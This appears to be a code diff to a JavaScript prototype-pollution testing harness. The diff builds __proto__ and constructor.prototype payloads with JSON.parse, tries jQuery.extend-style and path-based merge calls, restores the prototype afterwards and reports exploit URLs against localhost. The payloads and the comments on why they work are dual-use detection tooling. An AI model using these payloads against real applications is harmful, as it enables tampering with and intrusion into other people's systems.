@@ -283,26 +283,39 @@ function normalizeOutput(output) {
  * @returns {object|null} Differential result if PP detected
  */
 export async function executeMergePPTest(fn, baseArgs, prop, val, timeoutMs = 5000) {
+  // CRITICAL: { __proto__: {...} } as a JS literal sets the prototype chain,
+  // it does NOT create an own property named "__proto__". Deep merge functions
+  // like jQuery.extend iterate own properties, so they'd never see it.
+  // JSON.parse creates a real own property named "__proto__" — this is how
+  // real-world attacks work (attacker-controlled JSON from HTTP request body).
   const payloads = [
-    { __proto__: { [prop]: val } },
+    JSON.parse(`{"__proto__":{"${prop}":${JSON.stringify(val)}}}`),
     { constructor: { prototype: { [prop]: val } } },
   ];
 
+  // Try multiple calling conventions:
+  // 1. fn({}, payload) — standard merge (lodash.merge, Object.assign wrappers)
+  // 2. fn(true, {}, payload) — deep merge (jQuery.extend, deepmerge)
+  // 3. fn('__proto__.' + prop, val) — path-based set (lodash.set)
+  const argVariants = [
+    baseArgs,                           // original: fn({}, payload)
+    [true, ...baseArgs],                // deep copy: fn(true, {}, payload) — jQuery.extend
+    [baseArgs[0] || {}, baseArgs[0] || {}],  // self-merge variant
+  ];
+
   for (const payload of payloads) {
+    for (const variant of argVariants) {
     const snapshot = snapshotPrototype();
 
-    const args = baseArgs.map((arg, i) => {
-      if (i === 0 && arg && typeof arg === 'object') {
+    const args = variant.map((arg, i) => {
+      if (arg && typeof arg === 'object') {
         try { return structuredClone(arg); } catch { return arg; }
       }
       return arg;
     });
 
-    if (args.length > 1 && args[1] && typeof args[1] === 'object') {
-      Object.assign(args[1], payload);
-    } else {
-      args.push(payload);
-    }
+    // Append payload to the end of args
+    args.push(payload);
 
     logger.debug(`MergePP calling fn with ${args.length} args, payload keys: ${Object.keys(payload).join(',')}`);
 
@@ -348,6 +361,50 @@ export async function executeMergePPTest(fn, baseArgs, prop, val, timeoutMs = 50
         error
       };
     }
+    } // end argVariants loop
+  }
+
+  // Also try path-based set pattern: fn(obj, '__proto__.prop', val)
+  const pathPayloads = [
+    [`__proto__.${prop}`, val],
+    [`constructor.prototype.${prop}`, val],
+  ];
+  for (const [pathStr, pathVal] of pathPayloads) {
+    const snapshot = snapshotPrototype();
+    let output = null;
+    let error = null;
+    let timer;
+    try {
+      const timeoutPromise = new Promise((_, reject) => {
+        timer = setTimeout(() => reject(new Error('Execution timeout')), timeoutMs);
+      });
+      output = await Promise.race([Promise.resolve(fn({}, pathStr, pathVal)), timeoutPromise]);
+    } catch (e) {
+      error = e.message;
+    } finally {
+      clearTimeout(timer);
+    }
+    const detection = detectAndRestorePrototype(snapshot);
+    if (detection.polluted) {
+      const payloadType = pathStr.startsWith('__proto__') ? '__proto__path' : 'constructor.prototype.path';
+      return {
+        diff: {
+          property: detection.newProps[0] || prop,
+          payload: val,
+          isConfirmedGadget: true,
+          confidence: 0.95,
+          prototypePolluted: true,
+          pollutedProperties: detection.newProps,
+          pollutionWasRead: false,
+          outputChanged: false,
+          errorChanged: false,
+          newSinkAccesses: [],
+          details: { payloadType, payloadReachedOutput: false }
+        },
+        output,
+        error
+      };
+    }
   }
 
   return null;
@@ -371,10 +428,13 @@ export async function executeMergePPTest(fn, baseArgs, prop, val, timeoutMs = 50
  * @returns {object|null} Result with exploit URL if PP detected
  */
 export async function executeURLGadgetTest(fn, prop, val, timeoutMs = 5000) {
+  // Use JSON.parse for __proto__ payloads — JS literals set prototype chain,
+  // not an own property. Real attacks use parsed JSON (from HTTP body/query).
+  const valStr = JSON.stringify(val);
   const urlPayloads = [
     {
       url: `http://localhost/?__proto__[${encodeURIComponent(prop)}]=${encodeURIComponent(val)}`,
-      object: { __proto__: { [prop]: val } },
+      object: JSON.parse(`{"__proto__":{"${prop}":${valStr}}}`),
       payloadType: 'url___proto__',
     },
     {
@@ -384,17 +444,24 @@ export async function executeURLGadgetTest(fn, prop, val, timeoutMs = 5000) {
     },
     {
       url: `http://localhost/?${encodeURIComponent(prop)}[__proto__][${encodeURIComponent(prop)}]=${encodeURIComponent(val)}`,
-      object: (() => { const o = {}; o[prop] = { __proto__: { [prop]: val } }; return o; })(),
+      object: JSON.parse(`{"${prop}":{"__proto__":{"${prop}":${valStr}}}}`),
       payloadType: 'url_nested___proto__',
     },
     {
       url: `http://localhost/?a[__proto__][${encodeURIComponent(prop)}]=${encodeURIComponent(val)}`,
-      object: { a: { __proto__: { [prop]: val } } },
+      object: JSON.parse(`{"a":{"__proto__":{"${prop}":${valStr}}}}`),
       payloadType: 'url_wrapped___proto__',
     },
   ];
 
+  // Try both shallow and deep merge calling conventions
+  const callVariants = [
+    (target, payload) => fn(target, payload),           // fn({}, payload) — standard merge
+    (target, payload) => fn(true, target, payload),     // fn(true, {}, payload) — deep merge (jQuery.extend)
+  ];
+
   for (const { url, object: payload, payloadType } of urlPayloads) {
+    for (const callFn of callVariants) {
     const snapshot = snapshotPrototype();
 
     let output = null;
@@ -404,7 +471,7 @@ export async function executeURLGadgetTest(fn, prop, val, timeoutMs = 5000) {
       const timeoutPromise = new Promise((_, reject) => {
         timer = setTimeout(() => reject(new Error('Execution timeout')), timeoutMs);
       });
-      output = await Promise.race([Promise.resolve(fn({}, payload)), timeoutPromise]);
+      output = await Promise.race([Promise.resolve(callFn({}, payload)), timeoutPromise]);
     } catch (e) {
       error = e.message;
     } finally {
@@ -437,6 +504,7 @@ export async function executeURLGadgetTest(fn, prop, val, timeoutMs = 5000) {
         error,
       };
     }
+    } // end callVariants loop
   }
 
   return null;
